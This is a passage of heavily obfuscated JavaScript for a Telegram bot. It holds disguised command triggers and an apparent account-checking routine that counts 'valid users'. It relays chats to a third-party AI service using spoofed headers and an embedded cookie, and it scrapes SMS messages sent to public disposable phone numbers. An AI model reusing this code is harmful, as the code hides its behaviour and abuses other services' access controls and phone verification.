                            'text': _0x1a6a19(0xdbb) + _0x1a6a19(0x276) + _0x1a6a19(0x611) + validUsers,
                            'callback_data': _0x49808f[_0x1a6a19(0x929)]
                        }]
                ]
            }
        };
    bot[_0x1a6a19(0x708) + _0x1a6a19(0x949) + 'up'](_0x2c67b1[_0x1a6a19(0x54f) + 'up'], {
        'chat_id': _0x32cfd8,
        'message_id': _0x5dd632
    });
}
function showFinalStatistics(_0x5576e1) {
    const _0x5a7a78 = _0x54266d, _0x1e63b2 = {
            'AdLWU': _0x5a7a78(0xc21),
            'yIRQx': _0x5a7a78(0x25a),
            'ODYGf': _0x5a7a78(0xa5c) + 's',
            'LlbHb': _0x5a7a78(0x8ed) + _0x5a7a78(0xa15) + _0x5a7a78(0x9c3) + _0x5a7a78(0x5a2) + _0x5a7a78(0x599)
        }, _0x3e6c42 = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x5a7a78(0xdbb) + _0x5a7a78(0x5bb) + _0x5a7a78(0x611) + checkedUsers,
                            'callback_data': _0x1e63b2[_0x5a7a78(0xdd9)]
                        }],
                    [{
                            'text': _0x5a7a78(0xdbb) + _0x5a7a78(0x276) + _0x5a7a78(0x611) + validUsers,
                            'callback_data': _0x1e63b2[_0x5a7a78(0x866)]
                        }],
                    [{
                            'text': _0x5a7a78(0x269) + _0x5a7a78(0x395) + md + _0x5a7a78(0xaa2) + validUsers + (_0x5a7a78(0x1dc) + _0x5a7a78(0xd60)),
                            'callback_data': _0x1e63b2[_0x5a7a78(0x1d0)]
                        }]
                ]
            }
        };
    bot[_0x5a7a78(0x741) + 'e'](_0x5576e1, _0x1e63b2[_0x5a7a78(0x245)], _0x3e6c42);
}
bot[_0x54266d(0xb39)](/\/stㄹㅎㅊart/, _0x329ba5 => {
    const _0x333d73 = _0x54266d, _0x2bf107 = {
            'Kwhfh': _0x333d73(0x192) + 'ات',
            'aGxNA': _0x333d73(0x428) + 'e',
            'rmTQt': _0x333d73(0x25f) + _0x333d73(0xc30) + _0x333d73(0xbb7) + _0x333d73(0x35e) + 'ت.'
        }, _0x2f0884 = _0x329ba5[_0x333d73(0x6a9)]['id'], _0x5e4c7d = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x2bf107[_0x333d73(0xca0)],
                            'callback_data': _0x2bf107[_0x333d73(0x83b)]
                        }]]
            }
        };
    bot[_0x333d73(0x741) + 'e'](_0x2f0884, _0x2bf107[_0x333d73(0x8ad)], _0x5e4c7d);
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), _0x50004b => {
    const _0x1cde60 = _0x54266d, _0x5cdfed = {
            'vTgSb': function (_0x5a332e, _0xa4cd28) {
                return _0x5a332e === _0xa4cd28;
            },
            'OPSZf': _0x1cde60(0x428) + 'e',
            'gTkLT': _0x1cde60(0x99a) + '1',
            'ltxNr': _0x1cde60(0x2bd),
            'HUHWv': _0x1cde60(0x2bb) + _0x1cde60(0x915),
            'mEKsC': _0x1cde60(0x489),
            'XkNlp': _0x1cde60(0xc1f),
            'MaPQI': _0x1cde60(0x1db),
            'nILUU': _0x1cde60(0x8a2),
            'zPUur': _0x1cde60(0x921) + 'e',
            'FVPjC': _0x1cde60(0x348),
            'QEzUO': _0x1cde60(0x9ee),
            'NxIKl': _0x1cde60(0xa4e),
            'dyJBP': _0x1cde60(0xaea),
            'EuiEY': _0x1cde60(0x3b4) + _0x1cde60(0x724),
            'bsuQY': function (_0x19cebe, _0x577849, _0x5e9a6b, _0x31b807) {
                return _0x19cebe(_0x577849, _0x5e9a6b, _0x31b807);
            }
        }, _0x51d4c7 = _0x50004b[_0x1cde60(0x842)][_0x1cde60(0x6a9)]['id'], _0x4b6a24 = _0x50004b[_0x1cde60(0x842)][_0x1cde60(0x57f)];
    if (_0x5cdfed[_0x1cde60(0x8a4)](_0x50004b[_0x1cde60(0x50f)], _0x5cdfed[_0x1cde60(0xb9d)])) {
        const _0x47e637 = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x5cdfed[_0x1cde60(0xdd5)],
                            'callback_data': _0x5cdfed[_0x1cde60(0x782)]
                        }],
                    [{
                            'text': _0x5cdfed[_0x1cde60(0xa6d)],
                            'callback_data': _0x5cdfed[_0x1cde60(0xcc2)]
                        }],
                    [{
                            'text': _0x5cdfed[_0x1cde60(0x517)],
                            'callback_data': _0x5cdfed[_0x1cde60(0x64c)]
                        }],
                    [{
                            'text': _0x5cdfed[_0x1cde60(0x470)],
                            'callback_data': _0x5cdfed[_0x1cde60(0x698)]
                        }],
                    [{
                            'text': _0x5cdfed[_0x1cde60(0xd96)],
                            'callback_data': _0x5cdfed[_0x1cde60(0x1b6)]
                        }],
                    [{
                            'text': _0x5cdfed[_0x1cde60(0xb7e)],
                            'callback_data': _0x5cdfed[_0x1cde60(0xc81)]
                        }]
                ]
            }
        };
        bot[_0x1cde60(0x708) + _0x1cde60(0xdb0)](_0x5cdfed[_0x1cde60(0x236)], {
            'chat_id': _0x51d4c7,
            'message_id': _0x4b6a24,
            'reply_markup': _0x47e637[_0x1cde60(0x54f) + 'up']
        });
    } else
        [
            _0x5cdfed[_0x1cde60(0x782)],
            _0x5cdfed[_0x1cde60(0xcc2)],
            _0x5cdfed[_0x1cde60(0x64c)],
            _0x5cdfed[_0x1cde60(0x698)],
            _0x5cdfed[_0x1cde60(0x1b6)],
            _0x5cdfed[_0x1cde60(0xc81)]
        ][_0x1cde60(0x439)](_0x50004b[_0x1cde60(0x50f)]) && _0x5cdfed[_0x1cde60(0xc17)](startSearch, _0x51d4c7, _0x4b6a24, _0x50004b[_0x1cde60(0x50f)]);
});
const chatSessions = {};
async function sendMessage(_0x30d7d2, _0x4955a4) {
    const _0x1e2695 = _0x54266d, _0x159be8 = {
            'xAEDV': _0x1e2695(0x6d1) + _0x1e2695(0x21d) + _0x1e2695(0xd6b) + 'at',
            'euHXc': _0x1e2695(0xc2d),
            'xngfm': _0x1e2695(0x804) + _0x1e2695(0x88f) + _0x1e2695(0xd38),
            'FZPeB': _0x1e2695(0x9d8) + _0x1e2695(0x681),
            'YDnmk': _0x1e2695(0x31b) + _0x1e2695(0xc55) + _0x1e2695(0x990) + _0x1e2695(0x746) + _0x1e2695(0x601) + _0x1e2695(0x29b) + _0x1e2695(0x184) + _0x1e2695(0xa51) + _0x1e2695(0xc56) + _0x1e2695(0xcc4) + _0x1e2695(0x8b0) + _0x1e2695(0x5f8) + _0x1e2695(0xaa3) + _0x1e2695(0xd9c) + _0x1e2695(0x4c2) + _0x1e2695(0x828) + _0x1e2695(0xb06) + _0x1e2695(0x2d6) + _0x1e2695(0x25c) + _0x1e2695(0xa2e),
            'OuiFA': _0x1e2695(0x6d1) + _0x1e2695(0x21d) + _0x1e2695(0xdb6),
            'auYBL': _0x1e2695(0x6d1) + _0x1e2695(0x21d) + _0x1e2695(0x3c9),
            'RfcLP': _0x1e2695(0x700) + _0x1e2695(0xd01) + _0x1e2695(0x385) + _0x1e2695(0x298),
            'tjToC': _0x1e2695(0xb6d),
            'zjtSn': _0x1e2695(0xbc7) + _0x1e2695(0x62f) + _0x1e2695(0xc89) + _0x1e2695(0x893) + _0x1e2695(0x956) + _0x1e2695(0x74f) + _0x1e2695(0xa25) + _0x1e2695(0xdb4) + _0x1e2695(0xba1) + _0x1e2695(0xa9a) + _0x1e2695(0x3bb) + '6',
            'mPvFN': _0x1e2695(0x4f2),
            'tPpZQ': _0x1e2695(0xc71),
            'TzfbL': _0x1e2695(0xbf6),
            'Cnohz': function (_0x145738, _0x5238eb) {
                return _0x145738 - _0x5238eb;
            },
            'aXJmf': _0x1e2695(0x937)
        }, _0xfbf82 = _0x159be8[_0x1e2695(0x357)], _0x25be17 = {
            'accept': _0x159be8[_0x1e2695(0xbcf)],
            'accept-language': _0x159be8[_0x1e2695(0xd3b)],
            'content-type': _0x159be8[_0x1e2695(0x25b)],
            'cookie': _0x159be8[_0x1e2695(0x60f)],
            'origin': _0x159be8[_0x1e2695(0x3af)],
            'referer': _0x159be8[_0x1e2695(0x452)],
            'sec-ch-ua': _0x159be8[_0x1e2695(0x210)],
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': _0x159be8[_0x1e2695(0x79c)],
            'user-agent': _0x159be8[_0x1e2695(0x763)]
        }, _0x466a28 = chatSessions[_0x4955a4]?.[_0x1e2695(0x4b2)] || [], _0x4e9a84 = {
            'messages': [
                ..._0x466a28,
                {
                    'role': _0x159be8[_0x1e2695(0x5fd)],
                    'content': _0x30d7d2,
                    'id': _0x4955a4
                }
            ],
            'id': _0x159be8[_0x1e2695(0x6fd)],
            'previewToken': null,
            'userId': null,
            'codeModelMode': !![],
            'agentMode': {},
            'trendingAgentMode': {},
            'isMicMode': ![],
            'userSystemPrompt': null,
            'maxTokens': 0x400,
            'playgroundTopP': 0.9,
            'playgroundTemperature': 0.5,
            'isChromeExt': ![],
            'githubToken': null,
            'clickedAnswer2': ![],
            'clickedAnswer3': ![],
            'clickedForceWebSearch': ![],
            'visitFromDelta': ![],
            'mobileClient': ![],
            'userSelectedModel': _0x159be8[_0x1e2695(0xd12)]
        };
    try {
        const _0x4927ec = Date[_0x1e2695(0x45d)](), _0x4e75dc = await axios[_0x1e2695(0xa54)](_0xfbf82, _0x4e9a84, { 'headers': _0x25be17 });
        let _0x19ee0c = _0x4e75dc[_0x1e2695(0x50f)];
        const _0x2727f2 = Date[_0x1e2695(0x45d)]();
        return console[_0x1e2695(0xb18)](_0x1e2695(0x18c) + _0x1e2695(0xae4) + _0x1e2695(0x272) + _0x159be8[_0x1e2695(0x9dc)](_0x2727f2, _0x4927ec) + (_0x1e2695(0x694) + 'ة.')), chatSessions[_0x4955a4] = {
            'messages': [
                ..._0x4e9a84[_0x1e2695(0x4b2)],
                {
                    'role': _0x159be8[_0x1e2695(0xdef)],
                    'content': _0x19ee0c
                }
            ]
        }, _0x19ee0c;
    } catch (_0x57b8f6) {
        return _0x1e2695(0x37b) + _0x57b8f6[_0x1e2695(0x842)];
    }
}
bot['on'](_0x54266d(0x546) + _0x54266d(0x352), async _0x14a964 => {
    const _0x118248 = _0x54266d, _0x32f67d = {
            'vKWVz': _0x118248(0x8f8) + _0x118248(0x84e) + _0x118248(0x446) + _0x118248(0xbdd) + _0x118248(0x567) + _0x118248(0x8f7) + _0x118248(0x849),
            'FlzRm': function (_0x1664ec, _0x35afd9) {
                return _0x1664ec === _0x35afd9;
            },
            'KxjMw': _0x118248(0x90d) + _0x118248(0xdf2),
            'yUlEr': function (_0x4fb7b3, _0x2bfabe, _0x5b2dcc) {
                return _0x4fb7b3(_0x2bfabe, _0x5b2dcc);
            },
            'RluJG': function (_0x10931e, _0x148ab4) {
                return _0x10931e * _0x148ab4;
            },
            'ZRzJv': function (_0x2f2ecf, _0x177d14) {
                return _0x2f2ecf * _0x177d14;
            },
            'BRuus': _0x118248(0x1a7) + _0x118248(0xc61),
            'NExJV': _0x118248(0x417) + _0x118248(0x1f7),
            'xOhco': function (_0x2e8599, _0x2c2373, _0x252d11) {
                return _0x2e8599(_0x2c2373, _0x252d11);
            },
            'GFnAN': _0x118248(0xe19) + _0x118248(0x316),
            'VWauE': _0x118248(0x6fa) + _0x118248(0xe14) + _0x118248(0x7d2) + _0x118248(0xb74) + _0x118248(0xafc) + _0x118248(0x66a) + _0x118248(0x87d) + _0x118248(0x3c8) + _0x118248(0xbfe) + _0x118248(0x29e) + _0x118248(0x4e7) + _0x118248(0x492) + _0x118248(0x85a) + _0x118248(0x545) + _0x118248(0x901) + _0x118248(0xdb9) + 'ي\x20',
            'nzBZR': function (_0x1d0d51, _0x452646, _0x42849d) {
                return _0x1d0d51(_0x452646, _0x42849d);
            }
        }, _0x294590 = _0x14a964[_0x118248(0x842)][_0x118248(0x6a9)]['id'];
    bot[_0x118248(0x9c4) + _0x118248(0x42d)](_0x14a964['id']);
    if (_0x32f67d[_0x118248(0x7b4)](_0x14a964[_0x118248(0x50f)], _0x32f67d[_0x118248(0x7cc)])) {
        chatSessions[_0x294590] = { 'messages': [] }, _0x32f67d[_0x118248(0x8d3)](setTimeout, () => {
            const _0x1f952c = _0x118248;
            delete chatSessions[_0x294590], bot[_0x1f952c(0x741) + 'e'](_0x294590, _0x32f67d[_0x1f952c(0xd55)]);
        }, _0x32f67d[_0x118248(0xb68)](_0x32f67d[_0x118248(0x577)](-0x2a3 + -0x1 * 0x1c09 + -0xa3b * -0x3, 0xf7 * 0xd + 0x5 * -0x64d + 0x1332), -0x125 * 0x1d + 0x13c * -0x5 + 0x2b45));
        const _0x313f4f = _0x32f67d[_0x118248(0x5ce)], _0x4e780c = await bot[_0x118248(0x741) + 'e'](_0x294590, _0x32f67d[_0x118248(0xdee)]), _0x31cf4e = await _0x32f67d[_0x118248(0x5b6)](sendMessage, _0x313f4f, _0x294590);
        await bot[_0x118248(0x708) + _0x118248(0xdb0)](_0x31cf4e, {
            'chat_id': _0x294590,
            'message_id': _0x4e780c[_0x118248(0x57f)]
        });
    } else {
        if (_0x32f67d[_0x118248(0x7b4)](_0x14a964[_0x118248(0x50f)], _0x32f67d[_0x118248(0x9ae)])) {
            const _0x2619bd = _0x32f67d[_0x118248(0x75f)], _0x483953 = await _0x32f67d[_0x118248(0x7f7)](sendMessage, _0x2619bd, _0x294590);
            bot[_0x118248(0x741) + 'e'](_0x294590, _0x118248(0xbe6) + _0x118248(0x620) + _0x118248(0x83e) + _0x483953);
        }
    }
}), bot['on'](_0x54266d(0x842), async _0x36449d => {
    const _0x1db23e = _0x54266d, _0x3433c1 = {
            'irTdI': _0x1db23e(0x417) + _0x1db23e(0x1f7),
            'XWxCc': function (_0xbc78b3, _0x32e6df, _0x2d86eb) {
                return _0xbc78b3(_0x32e6df, _0x2d86eb);
            }
        }, _0x477b00 = _0x36449d[_0x1db23e(0x6a9)]['id'];
    if (chatSessions[_0x477b00]) {
        const _0x7dd990 = await bot[_0x1db23e(0x741) + 'e'](_0x477b00, _0x3433c1[_0x1db23e(0x448)]), _0x3af358 = await _0x3433c1[_0x1db23e(0x3ff)](sendMessage, _0x36449d[_0x1db23e(0x9ac)], _0x477b00);
        await bot[_0x1db23e(0x708) + _0x1db23e(0xdb0)](_0x3af358, {
            'chat_id': _0x477b00,
            'message_id': _0x7dd990[_0x1db23e(0x57f)]
        });
    } else
        bot[_0x1db23e(0x741) + 'e'](_0x477b00, '');
});
const الدول = {
    '+1': [
        _0x54266d(0x28c),
        _0x54266d(0x60c)
    ],
    '+46': [
        _0x54266d(0xaec),
        _0x54266d(0x581)
    ],
    '+86': [
        _0x54266d(0x34c),
        _0x54266d(0x344)
    ],
    '+852': [
        _0x54266d(0x35f),
        _0x54266d(0x93f)
    ],
    '+45': [
        _0x54266d(0x7f5),
        _0x54266d(0x56b)
    ],
    '+33': [
        _0x54266d(0x7cb),
        _0x54266d(0x1e0)
    ],
    '+31': [
        _0x54266d(0xdbe),
        _0x54266d(0x1ab)
    ],
    '+7': [
        _0x54266d(0x7b0),
        _0x54266d(0x238)
    ],
    '+7KZ': [
        _0x54266d(0xd11),
        _0x54266d(0x365)
    ],
    '+381': [
        _0x54266d(0xda6),
        _0x54266d(0x73c)
    ],
    '+44': [
        _0x54266d(0x7b5),
        _0x54266d(0x4bc)
    ],
    '+371': [
        _0x54266d(0xad2),
        _0x54266d(0xa2f)
    ],
    '+62': [
        _0x54266d(0xb69),
        _0x54266d(0x994)
    ],
    '+351': [
        _0x54266d(0x841),
        _0x54266d(0x3f2)
    ],
    '+34': [
        _0x54266d(0x907),
        _0x54266d(0xd9b)
    ],
    '+372': [
        _0x54266d(0x685),
        _0x54266d(0x49d)
    ],
    '+358': [
        _0x54266d(0xd6e),
        _0x54266d(0xb12)
    ],
    '+61': [
        _0x54266d(0x666),
        _0x54266d(0x2cd)
    ],
    '+55': [
        _0x54266d(0x875),
        _0x54266d(0xd8e)
    ],
    '+229': [
        _0x54266d(0xc64),
        _0x54266d(0x338)
    ],
    '+43': [
        _0x54266d(0x2fb),
        _0x54266d(0xd6c)
    ],
    '+54': [
        _0x54266d(0x669),
        _0x54266d(0x6bb)
    ],
    '+961': [
        _0x54266d(0xbc6),
        _0x54266d(0x73e)
    ],
    '+49': [
        _0x54266d(0x5da),
        _0x54266d(0x391)
    ],
    '+994': [
        _0x54266d(0xb83),
        _0x54266d(0xa6e)
    ],
    '+351': [
        _0x54266d(0xc50),
        _0x54266d(0x3f2)
    ],
    '+60': [
        _0x54266d(0x97d),
        _0x54266d(0xa0c)
    ],
    '+63': [
        _0x54266d(0x358),
        _0x54266d(0x626)
    ]
};
async function استيراد_الأرقام() {
    const _0x1c1f87 = _0x54266d, _0x21ae50 = {
            'tRUfW': function (_0x56702f, _0x62777c) {
                return _0x56702f(_0x62777c);
            },
            'LUvaU': _0x1c1f87(0x1f1) + _0x1c1f87(0x51e) + _0x1c1f87(0xd90)
        };
    try {
        const _0x46b654 = await _0x21ae50[_0x1c1f87(0x987)](fetch, _0x21ae50[_0x1c1f87(0x6bf)]), _0x3f01ed = await _0x46b654[_0x1c1f87(0x9ac)]();
        return _0x3f01ed[_0x1c1f87(0x7aa)]('\x0a');
    } catch (_0x261f48) {
        return console[_0x1c1f87(0x3a5)](_0x1c1f87(0x222) + _0x1c1f87(0x7ad) + _0x261f48), [];
    }
}
async function الحصول_على_معلومات_رقم_عشوائي() {
    const _0x515fe1 = _0x54266d, _0x5b1d72 = {
            'ZGyRR': function (_0x34dbc7) {
                return _0x34dbc7();
            },
            'vgrYS': function (_0x74382d, _0x1c61c5) {
                return _0x74382d === _0x1c61c5;
            },
            'qPUbU': function (_0x3b7ff2, _0x5615d0) {
                return _0x3b7ff2(_0x5615d0);
            },
            'bPhaE': _0x515fe1(0x248),
            'lTikN': _0x515fe1(0x187),
            'YTrXK': _0x515fe1(0x8e5) + _0x515fe1(0x455)
        }, _0x32f756 = await _0x5b1d72[_0x515fe1(0x1a6)](استيراد_الأرقام);
    if (_0x5b1d72[_0x515fe1(0x355)](_0x32f756[_0x515fe1(0x574)], 0x254f * 0x1 + -0x189 * -0x9 + -0x3320))
        return null;
    const _0x50d2d1 = _0x32f756[_0x5b1d72[_0x515fe1(0xb1f)](randomInt, _0x32f756[_0x515fe1(0x574)])][_0x515fe1(0x79d)](), _0x41c7c8 = new Date()[_0x515fe1(0x808) + 'g']()[_0x515fe1(0x7aa)]('T')[-0x1d0e * -0x1 + -0x329 + 0x3b3 * -0x7], _0x2020f6 = new Date()[_0x515fe1(0x8dc) + _0x515fe1(0x5ab)](_0x5b1d72[_0x515fe1(0x7f1)], {
            'hour': _0x5b1d72[_0x515fe1(0x8cb)],
            'minute': _0x5b1d72[_0x515fe1(0x8cb)],
            'hour12': !![]
        });
    let _0x340f5b = Object[_0x515fe1(0x9b0)](الدول)[_0x515fe1(0x508)](_0x45ed81 => _0x50d2d1[_0x515fe1(0xd2d)](_0x45ed81)) || _0x50d2d1[_0x515fe1(0x887)](0x23 * -0x11b + -0x1c6e + -0x431f * -0x1, 0x26ba + 0x5b3 + -0x2c69 * 0x1);
    const _0x764260 = الدول[_0x340f5b] || [
        _0x5b1d72[_0x515fe1(0x378)],
        '🚩'
    ];
    return {
        'رقم': _0x50d2d1,
        'رمز_الدولة': _0x340f5b,
        'اسم_الدولة': _0x764260[-0x841 * 0x2 + -0x1 * -0x486 + 0xbfc],
        'علم_الدولة': _0x764260[-0x804 + -0x87a + 0x107f],
        'تاريخ_الإنشاء': _0x41c7c8,
        'وقت_الإنشاء': _0x2020f6
    };
}
async function استخراج_الرسائل_من_الموقع(_0x54b1f8) {
    const _0x121383 = _0x54266d, _0x56cc4a = {
            'aKwBZ': function (_0x3c4156, _0x3d0b39) {
                return _0x3c4156(_0x3d0b39);
            },
            'HHuES': _0x121383(0xd36),
            'aSjAD': function (_0x2ab109, _0x37ab9d) {
                return _0x2ab109(_0x37ab9d);
            },
            'WWVaP': _0x121383(0x81d),
            'cgsuZ': _0x121383(0x678) + _0x121383(0x26f),
            'RdWzr': _0x121383(0xb75) + _0x121383(0x9d8) + _0x121383(0x96f) + _0x121383(0x5ba) + _0x121383(0xb04) + _0x121383(0x687) + _0x121383(0x2ee) + _0x121383(0x7e8) + _0x121383(0x595) + _0x121383(0x82c) + _0x121383(0x8c2) + _0x121383(0xdd1) + _0x121383(0xa81) + _0x121383(0xad9),
            'QreRV': _0x121383(0x68f) + _0x121383(0x922) + _0x121383(0xa61) + _0x121383(0xad9),
            'HLzsi': _0x121383(0x2cb),
            'ylDUz': _0x121383(0xbc7) + _0x121383(0x62f) + _0x121383(0xc89) + _0x121383(0x893) + _0x121383(0x956) + _0x121383(0x74f) + _0x121383(0xa25) + _0x121383(0xdb4) + _0x121383(0xba1) + _0x121383(0xa9a) + _0x121383(0x3bb) + '6',
            'KVMED': function (_0x388c7b, _0x4555b2, _0x3d27e6) {
                return _0x388c7b(_0x4555b2, _0x3d27e6);
            },
            'RxLmH': _0x121383(0x650) + _0x121383(0x408) + _0x121383(0x689)
        }, _0x1f6a41 = _0x121383(0x1cc) + _0x121383(0x9f1) + _0x121383(0x723) + _0x121383(0x511) + _0x54b1f8, _0x590262 = {
            'authority': _0x56cc4a[_0x121383(0x86f)],
            'accept': _0x56cc4a[_0x121383(0xd43)],
            'accept-language': _0x56cc4a[_0x121383(0xe2d)],
            'cache-control': _0x56cc4a[_0x121383(0x640)],
            'user-agent': _0x56cc4a[_0x121383(0xa82)]
        }, _0x528116 = await _0x56cc4a[_0x121383(0xb5a)](fetch, _0x1f6a41, { 'headers': _0x590262 });
    if (_0x528116['ok']) {
        const _0x491939 = await _0x528116[_0x121383(0x9ac)](), _0x2ce251 = cheerio[_0x121383(0x1be)](_0x491939), _0x5afded = [];
        return _0x56cc4a[_0x121383(0x38d)](_0x2ce251, _0x56cc4a[_0x121383(0xa47)])[_0x121383(0x90f)]((_0x2992c0, _0x5db436) => {
            const _0x20eb6f = _0x121383, _0x12f03d = _0x56cc4a[_0x20eb6f(0x38d)](_0x2ce251, _0x5db436)[_0x20eb6f(0x508)](_0x56cc4a[_0x20eb6f(0x8f0)])[_0x20eb6f(0x9ac)]()[_0x20eb6f(0x79d)](), _0x375634 = _0x56cc4a[_0x20eb6f(0x948)](_0x2ce251, _0x5db436)[_0x20eb6f(0x508)](_0x56cc4a[_0x20eb6f(0xa12)])[_0x20eb6f(0x9ac)]()[_0x20eb6f(0x79d)]();
            _0x5afded[_0x20eb6f(0xb97)]([
                _0x12f03d,
                _0x375634
            ]);
        }), _0x5afded[_0x121383(0x887)](-0xa * -0x15a + 0x1fd6 + -0x2d5a, 0x16e * 0x9 + -0x6 * 0x229 + -0x1 * -0x1d);
    } else
        return null;
}
bot[_0x54266d(0xb39)](/\/starㅇ함ㅏㅏㅗht/, async _0x3ccb2e => {
    const _0x574e22 = _0x54266d, _0x205f87 = {
            'ZVRVc': _0x574e22(0xc30) + _0x574e22(0x6a1) + _0x574e22(0xa7a) + _0x574e22(0x576),
            'TDIMa': _0x574e22(0x99e) + _0x574e22(0x811),
            'VBOFA': _0x574e22(0xd95) + _0x574e22(0x403)
        }, _0x400b98 = _0x3ccb2e[_0x574e22(0x6a9)]['id'];
    bot[_0x574e22(0x741) + 'e'](_0x400b98, _0x205f87[_0x574e22(0xaf5)], {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x205f87[_0x574e22(0x2b8)],
                        'callback_data': _0x205f87[_0x574e22(0x2ff)]
                    }]]
        }
    });
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), async _0x121e21 => {
    const _0x55204b = _0x54266d, _0x255e78 = {
            'MhKAw': function (_0x152fda, _0x573c6d) {
                return _0x152fda === _0x573c6d;
            },
            'UBzdh': _0x55204b(0xd95) + _0x55204b(0x403),
            'FFsfE': function (_0x5770de) {
                return _0x5770de();
            },
            'BblCC': function (_0x569336, _0x5e8e16, _0x8f0f8a) {
                return _0x569336(_0x5e8e16, _0x8f0f8a);
            },
            'ZZQyQ': _0x55204b(0xae9),
            'RCEGX': function (_0x4abf2b, _0x28074b) {
                return _0x4abf2b(_0x28074b);
            },
            'LwUAB': _0x55204b(0x801),
            'llhLB': _0x55204b(0xbb6) + _0x55204b(0xe0a),
            'ZgSzQ': _0x55204b(0xd5e) + 'م',
            'vOuGN': function (_0x581d9e) {
                return _0x581d9e();
            }
        }, _0x586f93 = _0x121e21[_0x55204b(0x842)][_0x55204b(0x6a9)]['id'];
    if (_0x255e78[_0x55204b(0x1ca)](_0x121e21[_0x55204b(0x50f)], _0x255e78[_0x55204b(0x55b)])) {
        const _0x5d6cb2 = await _0x255e78[_0x55204b(0x1f6)](الحصول_على_معلومات_رقم_عشوائي);
        await _0x255e78[_0x55204b(0x1dd)](ارسال_معلومات_الرقم, _0x121e21[_0x55204b(0x842)], _0x5d6cb2);
    } else {
        if (_0x121e21[_0x55204b(0x50f)][_0x55204b(0xd2d)](_0x255e78[_0x55204b(0xa21)])) {
            const _0x276299 = _0x121e21[_0x55204b(0x50f)][_0x55204b(0x7aa)]('_')[-0x131 + -0xc2 * -0x30 + 0x232d * -0x1], _0x4ba917 = await _0x255e78[_0x55204b(0x2e7)](استخراج_الرسائل_من_الموقع, _0x276299);
            _0x4ba917 ? bot[_0x55204b(0x741) + 'e'](_0x586f93, _0x255e78[_0x55204b(0x2e7)](تنسيق_الرسائل, _0x4ba917), { 'parse_mode': _0x255e78[_0x55204b(0x27c)] }) : bot[_0x55204b(0x741) + 'e'](_0x586f93, _0x255e78[_0x55204b(0x747)]);
        } else {
            if (_0x255e78[_0x55204b(0x1ca)](_0x121e21[_0x55204b(0x50f)], _0x255e78[_0x55204b(0xbc5)])) {
                const _0x551e28 = await _0x255e78[_0x55204b(0x9f0)](الحصول_على_معلومات_رقم_عشوائي);
                await _0x255e78[_0x55204b(0x1dd)](تحديث_معلومات_الرقم, _0x121e21[_0x55204b(0x842)], _0x551e28);
            }
        }
    }
});
async function ارسال_معلومات_الرقم(_0x9d0629, _0x3b967a) {
    const _0x112e72 = _0x54266d, _0x63500e = {
            'sSrSF': function (_0x13cbb5, _0x2061b4) {
                return _0x13cbb5 + _0x2061b4;
            },
            'msYhY': function (_0x1a6d64, _0x1d494b) {
                return _0x1a6d64 + _0x1d494b;
            },
            'NDVUm': function (_0x26cf3b, _0x3875a7) {
                return _0x26cf3b + _0x3875a7;
            },
            'egTVG': function (_0x57695a, _0xbb3b5d) {
                return _0x57695a + _0xbb3b5d;
            },
            'BNEcv': _0x112e72(0x2c2),
            'VfgFC': _0x112e72(0xdcb),
            'uyJie': _0x112e72(0xae5),
            'OfZiW': _0x112e72(0x82d),
            'roCIC': _0x112e72(0x554) + _0x112e72(0x56e),
            'Wrfkz': _0x112e72(0x207) + 'ء',
            'zakCI': _0x112e72(0x368) + _0x112e72(0x67c),
            'pONIB': _0x112e72(0xd5e) + 'م',
            'FTMNa': _0x112e72(0x793) + '💬',
            'CAFBb': _0x112e72(0x801)
        }, _0x37bc63 = _0x9d0629[_0x112e72(0x6a9)]['id'], _0x144514 = _0x63500e[_0x112e72(0x1a9)](_0x63500e[_0x112e72(0x2ae)](_0x63500e[_0x112e72(0xb52)](_0x63500e[_0x112e72(0x1a9)](_0x63500e[_0x112e72(0x2ae)](_0x63500e[_0x112e72(0xb51)](_0x112e72(0x5e1) + _0x112e72(0xe16), _0x112e72(0xc28) + _0x112e72(0xaaa) + _0x3b967a[_0x63500e[_0x112e72(0x38a)]] + '`\x0a'), _0x112e72(0xd02) + '\x20' + _0x3b967a[_0x63500e[_0x112e72(0x530)]] + '\x20' + _0x3b967a[_0x63500e[_0x112e72(0xac7)]] + '\x0a'), _0x112e72(0xa2a) + _0x112e72(0x491) + _0x3b967a[_0x63500e[_0x112e72(0x858)]] + '\x0a'), _0x112e72(0x6c3) + _0x112e72(0x3cd) + _0x3b967a[_0x63500e[_0x112e72(0x41d)]] + '\x0a'), _0x112e72(0x46b) + _0x112e72(0xb9f) + _0x3b967a[_0x63500e[_0x112e72(0x5b2)]] + '\x0a'), _0x112e72(0x59e) + _0x112e72(0xb62) + _0x112e72(0xb30)), _0xb07f22 = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x63500e[_0x112e72(0x774)],
                            'callback_data': _0x63500e[_0x112e72(0xe22)]
                        }],
                    [{
                            'text': _0x63500e[_0x112e72(0x2b2)],
                            'callback_data': _0x112e72(0xae9) + _0x3b967a[_0x63500e[_0x112e72(0x38a)]]
                        }]
                ]
            }
        };
    await bot[_0x112e72(0x741) + 'e'](_0x37bc63, _0x144514, {
        'parse_mode': _0x63500e[_0x112e72(0xbaf)],
        'reply_markup': _0xb07f22[_0x112e72(0x54f) + 'up']
    });
}
async function تحديث_معلومات_الرقم(_0x2cfd6e, _0x227517) {
    const _0x44c466 = _0x54266d, _0x1cdf32 = {
            'vKHPz': function (_0x3d04dc, _0xba3b47) {
                return _0x3d04dc + _0xba3b47;
            },
            'iwNZD': function (_0x17187a, _0x2a7643) {
                return _0x17187a + _0x2a7643;
            },
            'cSirG': function (_0x34a5ee, _0x22e4c8) {
                return _0x34a5ee + _0x22e4c8;
            },
            'pktrL': function (_0x2c6a9f, _0x5564e1) {
                return _0x2c6a9f + _0x5564e1;
            },
            'GjAsf': function (_0x14450d, _0x1d8dd7) {
                return _0x14450d + _0x1d8dd7;
            },
            'qWCnK': _0x44c466(0x2c2),
            'VFzyI': _0x44c466(0xdcb),
            'hAnfa': _0x44c466(0xae5),
            'FVujI': _0x44c466(0x82d),
            'wSxsY': _0x44c466(0x554) + _0x44c466(0x56e),
            'nQJAO': _0x44c466(0x207) + 'ء',
            'OibiB': _0x44c466(0x368) + _0x44c466(0x67c),
